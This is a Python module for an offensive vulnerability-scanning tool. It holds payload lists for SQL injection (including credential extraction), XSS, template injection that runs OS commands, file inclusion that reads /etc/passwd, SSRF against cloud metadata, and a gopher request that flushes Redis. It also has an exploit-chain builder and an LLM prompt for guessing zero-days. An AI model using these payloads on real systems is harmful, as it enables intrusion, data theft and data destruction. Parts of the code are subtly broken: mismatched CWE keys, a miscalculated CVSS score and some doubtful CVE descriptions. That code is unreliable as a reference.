"""
vuln_engine.py — Elengenix Next-Gen Vulnerability Detection Engine
LLM-powered 0-day hunting, exploit chain builder, supply chain analysis.
Version: 1.0.0
"""

from __future__ import annotations

import hashlib
import json
import logging
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional

logger = logging.getLogger("elengenix.vuln_engine")

# ═══════════════════════════════════════════════════════════════════════════
# 1. VULNERABILITY TAXONOMY
# ═══════════════════════════════════════════════════════════════════════════


class VulnClass(Enum):
    """OWASP + beyond classifications."""

    INJECTION = "injection"  # SQLi, NoSQLi, LDAP, OS command
    XSS = "xss"  # Reflected, stored, DOM
    AUTH_BROKEN = "auth"  # Broken auth/session
    SENSITIVE_DATA = "sensitive"  # Data exposure
    XXE = "xxe"
    BROKEN_ACCESS = "access"  # IDOR, BOLA, BFLA
    MISCONFIG = "misconfig"
    CSRF = "csrf"
    VULN_COMPONENTS = "components"  # Supply chain, CVE
    LOGGING = "logging"
    SSRF = "ssrf"
    DESERIALIZATION = "deserialization"
    RACE_CONDITION = "race"
    BUSINESS_LOGIC = "business"
    API_ABUSE = "api"
    CRYPTO = "crypto"
    FILE_UPLOAD = "upload"
    SUBDOMAIN_TAKEOVER = "takeover"
    JWT = "jwt"
    GRAPHQL = "graphql"
    WEBSOCKET = "websocket"
    PROTOTYPE_POLLUTION = "prototype"
    TEMPLATE_INJECTION = "ssti"
    HTTP_SMUGGLING = "smuggling"
    CACHE_POISONING = "cache"
    ZERO_DAY = "zeroday"  # Unknown/LLM-predicted

    @property
    def cwe_ids(self) -> List[str]:
        cwe_map = {
            "injection": ["CWE-89", "CWE-78"],
            "xss": ["CWE-79"],
            "auth": ["CWE-287", "CWE-384"],
            "sensitive": ["CWE-200"],
            "xxe": ["CWE-611"],
            "access": ["CWE-639", "CWE-285"],
            "misconfig": ["CWE-16"],
            "csr": ["CWE-352"],
            "components": ["CWE-1104"],
            "logging": ["CWE-778"],
            "ssr": ["CWE-918"],
            "deserialization": ["CWE-502"],
            "race": ["CWE-362"],
            "business": ["CWE-840"],
            "api": ["CWE-20"],
            "crypto": ["CWE-327"],
            "upload": ["CWE-434"],
            "takeover": ["CWE-1188"],
            "jwt": ["CWE-347"],
            "graphql": ["CWE-200"],
            "websocket": ["CWE-1385"],
            "prototype": ["CWE-1321"],
            "ssti": ["CWE-94"],
            "smuggling": ["CWE-444"],
            "cache": ["CWE-524"],
            "zeroday": ["CWE-1000"],
        }
        return cwe_map.get(self.value, ["CWE-1000"])


class ExploitMaturity(Enum):
    UNPROVEN = "unproven"  # Theoretical
    PROOF_OF_CONCEPT = "poc"  # Reproducible
    FUNCTIONAL = "functional"  # Weaponized
    HIGH = "high"  # Automated


# ═══════════════════════════════════════════════════════════════════════════
# 2. VULNERABILITY DATA MODEL
# ═══════════════════════════════════════════════════════════════════════════


@dataclass
class VulnFinding:
    """A confirmed or hypothesized vulnerability."""

    id: str = ""
    title: str = ""
    vuln_class: VulnClass = VulnClass.INJECTION
    severity: str = "Medium"
    cvss_score: float = 5.0
    cvss_vector: str = ""
    url: str = ""
    method: str = "GET"
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    cwe: List[str] = field(default_factory=list)
    cve: Optional[str] = None
    description: str = ""
    impact: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    exploit_maturity: ExploitMaturity = ExploitMaturity.UNPROVEN
    confidence: float = 0.5
    chain: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    discovered_at: float = 0.0

    def __post_init__(self):
        if not self.id:
            h = hashlib.sha256(
                f"{self.url}:{self.parameter}:{self.vuln_class.value}".encode()
            ).hexdigest()[:12]
            self.id = f"VULN-{h.upper()}"
        if not self.cwe and self.vuln_class:
            self.cwe = self.vuln_class.cwe_ids
        import time

        if not self.discovered_at:
            self.discovered_at = time.time()

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "class": self.vuln_class.value,
            "severity": self.severity,
            "cvss": self.cvss_score,
            "cvss_vector": self.cvss_vector,
            "url": self.url,
            "method": self.method,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "cwe": self.cwe,
            "cve": self.cve,
            "description": self.description,
            "impact": self.impact,
            "remediation": self.remediation,
            "references": self.references,
            "exploit_maturity": self.exploit_maturity.value,
            "confidence": self.confidence,
            "chain": self.chain,
        }


# ═══════════════════════════════════════════════════════════════════════════
# 3. PAYLOAD GENERATORS — Smart, context-aware
# ═══════════════════════════════════════════════════════════════════════════


class PayloadGen:
    """Context-aware payload generation for various vuln classes."""

    SQLI_PAYLOADS = {
        "boolean": [
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' OR '1'='1'--",
            '1" OR "1"="1"--',
        ],
        "time": [
            "1' AND SLEEP(3)--",
            "1' WAITFOR DELAY '0:0:3'--",
            "1; SELECT pg_sleep(3)--",
            "1' AND (SELECT 1 FROM pg_sleep(3))::text='1'--",
        ],
        "union": [
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            "-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        ],
        "error": [
            "1' AND 1=CONVERT(int,(SELECT @@version))--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        ],
    }

    XSS_PAYLOADS = {
        "reflected": [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            '"><img src=x onerror=alert(document.domain)>',
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert(1) )//",
            '"><svg/onload=alert(1)><!--',
            "'-alert(1)-'",
        ],
        "dom": [
            "#<script>alert(1)</script>",
            "javascript:void(0);alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ],
    }

    SSTI_PAYLOADS = {
        "jinja2": [
            "{{7*7}}",
            "{{config}}",
            "{{config.SECRET_KEY}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ],
        "freemarker": [
            "${7*7}",
            '<#assign a="freemarker.template.utility.Execute"?new()> ${a("id")}',
        ],
        "twig": [
            "{{7*7}}",
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        ],
    }

    LFI_PAYLOADS = [
        "../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

    SSRF_PAYLOADS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        "gopher://localhost:6379/_FLUSHALL",
        "file:///etc/passwd",
    ]

    CMD_INJECTION = [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "$(id)",
        "`id`",
        "; sleep 3",
        "&& timeout 3",
    ]

    @classmethod
    def for_class(cls, vuln_class: VulnClass, ctx: Dict = None) -> List[str]:
        ctx = ctx or {}
        tech = ctx.get("tech_stack", "").lower()
        if vuln_class == VulnClass.INJECTION:
            return cls.SQLI_PAYLOADS["boolean"] + cls.SQLI_PAYLOADS["time"]
        if vuln_class == VulnClass.XSS:
            return cls.XSS_PAYLOADS["reflected"] + cls.XSS_PAYLOADS["polyglot"]
        if vuln_class == VulnClass.TEMPLATE_INJECTION:
            if "jinja" in tech or "python" in tech:
                return cls.SSTI_PAYLOADS["jinja2"]
            if "java" in tech:
                return cls.SSTI_PAYLOADS["freemarker"]
            if "php" in tech or "twig" in tech:
                return cls.SSTI_PAYLOADS["twig"]
            return sum(cls.SSTI_PAYLOADS.values(), [])
        if vuln_class == VulnClass.SSRF:
            return cls.SSRF_PAYLOADS
        if vuln_class == VulnClass.DESERIALIZATION:
            return ["__import__('os').system('id')", "{{7*7}}"]
        return []


# ═══════════════════════════════════════════════════════════════════════════
# 4. FINGERPRINTING — Tech stack + version detection
# ═══════════════════════════════════════════════════════════════════════════

TECH_SIGNATURES = {
    "WordPress": {
        "headers": [("X-Powered-By", "WordPress")],
        "paths": ["/wp-login.php", "/wp-admin/", "/wp-includes/"],
        "meta": [r'<meta name="generator" content="WordPress\s*([\d.]+)"'],
    },
    "Drupal": {
        "headers": [("X-Generator", "Drupal")],
        "paths": ["/sites/default/", "/core/misc/drupal.js"],
        "meta": [r'<meta name="generator" content="Drupal\s*([\d.]+)"'],
    },
    "Joomla": {
        "headers": [],
        "paths": ["/administrator/", "/components/com_content/"],
        "meta": [r'<meta name="generator" content="Joomla!\s*([\d.]+)"'],
    },
    "Django": {
        "headers": [("X-Frame-Options", "DENY"), ("Server", "WSGIServer")],
        "paths": ["/admin/", "/static/admin/"],
        "meta": [r'<meta name="generator" content="Django\s*([\d.]+)"'],
    },
    "Flask": {
        "headers": [("Server", "Werkzeug")],
        "paths": [],
        "meta": [],
    },
    "Express": {
        "headers": [("X-Powered-By", "Express")],
        "paths": [],
        "meta": [],
    },
    "Spring": {
        "headers": [("X-Application-Context", "")],
        "paths": ["/actuator/", "/actuator/env", "/swagger-ui.html"],
        "meta": [],
    },
    "ASP.NET": {
        "headers": [("X-AspNet-Version", ""), ("X-Powered-By", "ASP.NET")],
        "paths": ["/web.config", "/bin/", "/App_Data/"],
        "meta": [r'<meta name="generator" content="ASP\.NET\s*([\d.]+)"'],
    },
    "PHP": {
        "headers": [("X-Powered-By", "PHP")],
        "paths": [],
        "meta": [],
    },
    "Next.js": {
        "headers": [("X-Powered-By", "Next.js")],
        "paths": ["/_next/", "/_next/static/"],
        "meta": [],
    },
    "Nginx": {"headers": [("Server", "nginx")], "paths": [], "meta": []},
    "Apache": {"headers": [("Server", "Apache")], "paths": [], "meta": []},
    "Cloudflare": {"headers": [("Server", "cloudflare")], "paths": [], "meta": []},
    "AWS": {"headers": [("X-Amz-", "")], "paths": [], "meta": []},
}


def fingerprint_tech(
    headers: Dict[str, str], body: str = "", url: str = ""
) -> List[Dict[str, str]]:
    """Detect technology stack from response headers and body."""
    detected = []
    headers_lower = {k.lower(): v for k, v in headers.items()}

    for tech, sigs in TECH_SIGNATURES.items():
        score = 0
        version = ""
        # Check headers
        for h_key, h_val in sigs["headers"]:
            for resp_h, resp_v in headers.items():
                if resp_h.lower() == h_key.lower():
                    if h_val and h_val in resp_v:
                        score += 2
                        m = re.search(r"[\d.]+", resp_v)
                        if m:
                            version = m.group()
                    elif not h_val:
                        score += 1
        # Check meta tags
        for pattern in sigs["meta"]:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                score += 3
                if m.groups():
                    version = m.group(1)
        if score >= 1:
            detected.append({"tech": tech, "score": score, "version": version})
    detected.sort(key=lambda x: -x["score"])
    return detected


# ═══════════════════════════════════════════════════════════════════════════
# 5. EXPLOIT CHAIN BUILDER — Combine vulns into kill chain
# ═══════════════════════════════════════════════════════════════════════════


class KillChainPhase(Enum):
    """MITRE ATT&CK-inspired kill chain phases."""

    RECON = "recon"
    WEAPONIZE = "weaponize"
    DELIVER = "deliver"
    EXPLOIT = "exploit"
    INSTALL = "install"
    C2 = "c2"
    ACTIONS = "actions"
    OBJECTIVES = "objectives"


@dataclass
class ChainLink:
    """Single step in an exploit chain."""

    vuln_id: str
    phase: KillChainPhase
    description: str
    next_links: List[str] = field(default_factory=list)
    impact: str = ""


@dataclass
class ExploitChain:
    """Multi-step exploit path."""

    name: str
    target: str
    links: List[ChainLink] = field(default_factory=list)
    total_impact: str = ""
    risk_score: float = 0.0
    likelihood: float = 0.0

    def add(self, vuln: VulnFinding, phase: KillChainPhase, desc: str, impact: str = ""):
        link = ChainLink(
            vuln_id=vuln.id,
            phase=phase,
            description=desc,
            impact=impact,
        )
        self.links.append(link)
        return link

    def render(self) -> str:
        lines = [
            f"═══ {self.name} ═══",
            f"Target: {self.target}",
            f"Risk: {self.risk_score:.1f}/10",
        ]
        for i, link in enumerate(self.links, 1):
            lines.append(f"  {i}. [{link.phase.value.upper()}] {link.description}")
            if link.impact:
                lines.append(f"     → {link.impact}")
        if self.total_impact:
            lines.append(f"\nFINAL IMPACT: {self.total_impact}")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
# 6. SUPPLY CHAIN — CVE detection in tech stack
# ═══════════════════════════════════════════════════════════════════════════

# Curated mini-CVE database for common tech stacks
KNOWN_CVES = {
    "WordPress": {
        "5.0-5.8": [("CVE-2022-21661", "SQL Injection in WP_Query", 9.8)],
        "5.0-6.0": [("CVE-2023-39999", "Unauth file upload", 9.8)],
    },
    "Apache": {
        "2.4.0-2.4.49": [("CVE-2021-41773", "Path traversal", 7.5)],
        "2.4.0-2.4.50": [("CVE-2021-42013", "Path traversal RCE", 9.8)],
    },
    "Nginx": {
        "0.6.18-1.20.0": [("CVE-2021-23017", "DNS resolver heap overflow", 7.7)],
    },
    "Spring": {
        "5.0-5.3.17": [("CVE-2022-22965", "Spring4Shell RCE", 9.8)],
    },
    "Log4j": {
        "2.0-2.14.1": [("CVE-2021-44228", "Log4Shell RCE", 10.0)],
    },
}


def check_known_cves(tech: str, version: str) -> List[Dict]:
    """Check tech stack version against known CVEs."""
    cves = []
    for tech_pattern, version_map in KNOWN_CVES.items():
        if tech.lower() in tech_pattern.lower() or tech_pattern.lower() in tech.lower():
            for version_range, cve_data in version_map.items():
                if _version_in_range(version, version_range):
                    for cve_id, desc, score in cve_data:
                        cves.append(
                            {
                                "cve": cve_id,
                                "tech": tech_pattern,
                                "version": version,
                                "description": desc,
                                "cvss": score,
                            }
                        )
    return cves


def _version_in_range(version: str, range_str: str) -> bool:
    """Check if version is in range like '1.0-1.5' or '<2.4.49'."""
    try:
        v_parts = [int(x) for x in re.findall(r"\d+", version)]
        if not v_parts:
            return False
        if "-" in range_str:
            low, high = range_str.split("-", 1)
            low_parts = [int(x) for x in re.findall(r"\d+", low)]
            high_parts = [int(x) for x in re.findall(r"\d+", high)]
            return low_parts <= v_parts <= high_parts
        if range_str.startswith("<"):
            cap = [int(x) for x in re.findall(r"\d+", range_str)]
            return v_parts < cap
    except (ValueError, IndexError):
        return False
    return False


# ═══════════════════════════════════════════════════════════════════════════
# 7. LLM HINTS — AI-driven zero-day hypothesis
# ═══════════════════════════════════════════════════════════════════════════

LLM_HYPOTHESIS_PROMPT = """You are a senior security researcher. Given the target, identify the 3 most likely zero-day vulnerability hypotheses based on:
- Common patterns in modern web apps
- Recent CVEs in similar tech stacks
- The attacker's perspective on the highest-value targets

Target: {target}
Tech stack: {tech}
Known findings: {findings}

Output JSON array of hypothesis objects:
[{{"class": "...", "url": "...", "parameter": "...", "payload": "...", "reasoning": "..."}}]
"""


async def llm_hypothesize_zero_day(
    target: str, tech: str, findings: List[Dict], ai_client=None
) -> List[Dict]:
    """Use LLM to generate zero-day hypotheses."""
    if not ai_client:
        return []
    try:
        prompt = LLM_HYPOTHESIS_PROMPT.format(
            target=target, tech=tech, findings=json.dumps(findings[:10], default=str)
        )
        response = await ai_client.complete(prompt)
        if response:
            m = re.search(r"\[.*\]", response, re.DOTALL)
            if m:
                return json.loads(m.group())
    except Exception as e:
        logger.debug(f"LLM hypothesis failed: {e}")
    return []


# ═══════════════════════════════════════════════════════════════════════════
# 8. CVSS v3.1 CALCULATOR — Vector-based scoring
# ═══════════════════════════════════════════════════════════════════════════

CVSS_WEIGHTS = {
    "AV": {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2},
    "AC": {"L": 0.77, "H": 0.44},
    "PR": {"N": 0.85, "L": 0.62, "H": 0.27},
    "UI": {"N": 0.85, "R": 0.62},
    "S": {"U": 6.42, "C": 7.52, "H": 8.22},
    "C": {"H": 0.56, "L": 0.22, "N": 0.0},
    "I": {"H": 0.56, "L": 0.22, "N": 0.0},
    "A": {"H": 0.56, "L": 0.22, "N": 0.0},
}


def calculate_cvss(vector: str) -> float:
    """Calculate CVSS v3.1 base score from vector string.
    Example: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'"""
    try:
        if not vector.startswith("CVSS:3"):
            return 0.0
        parts = vector.split("/")
        metrics = {}
        for p in parts[1:]:
            k, v = p.split(":")
            metrics[k] = v

        av = CVSS_WEIGHTS["AV"][metrics.get("AV", "N")]
        ac = CVSS_WEIGHTS["AC"][metrics.get("AC", "L")]
        pr_raw = CVSS_WEIGHTS["PR"][metrics.get("PR", "N")]
        ui = CVSS_WEIGHTS["UI"][metrics.get("UI", "N")]
        s = CVSS_WEIGHTS["S"][metrics.get("S", "U")]
        c = CVSS_WEIGHTS["C"][metrics.get("C", "N")]
        i = CVSS_WEIGHTS["I"][metrics.get("I", "N")]
        a = CVSS_WEIGHTS["A"][metrics.get("A", "N")]

        isc_base = 1 - (1 - c) * (1 - i) * (1 - a)
        impact = s * isc_base
        exploitability = 8.22 * av * ac * pr_raw * ui
        if impact <= 0:
            return 0.0
        if s == 6.42:
            base = min(impact + exploitability, 10)
        else:
            base = min(1.08 * (impact + exploitability), 10)
        return round(base, 1)
    except (KeyError, ValueError, IndexError):
        return 0.0


def severity_from_cvss(score: float) -> str:
    if score >= 9.0:
        return "Critical"
    if score >= 7.0:
        return "High"
    if score >= 4.0:
        return "Medium"
    if score > 0.0:
        return "Low"
    return "Informational"


__all__ = [
    "VulnClass",
    "ExploitMaturity",
    "VulnFinding",
    "PayloadGen",
    "TECH_SIGNATURES",
    "fingerprint_tech",
    "KillChainPhase",
    "ChainLink",
    "ExploitChain",
    "KNOWN_CVES",
    "check_known_cves",
    "llm_hypothesize_zero_day",
    "LLM_HYPOTHESIS_PROMPT",
    "calculate_cvss",
    "severity_from_cvss",
]
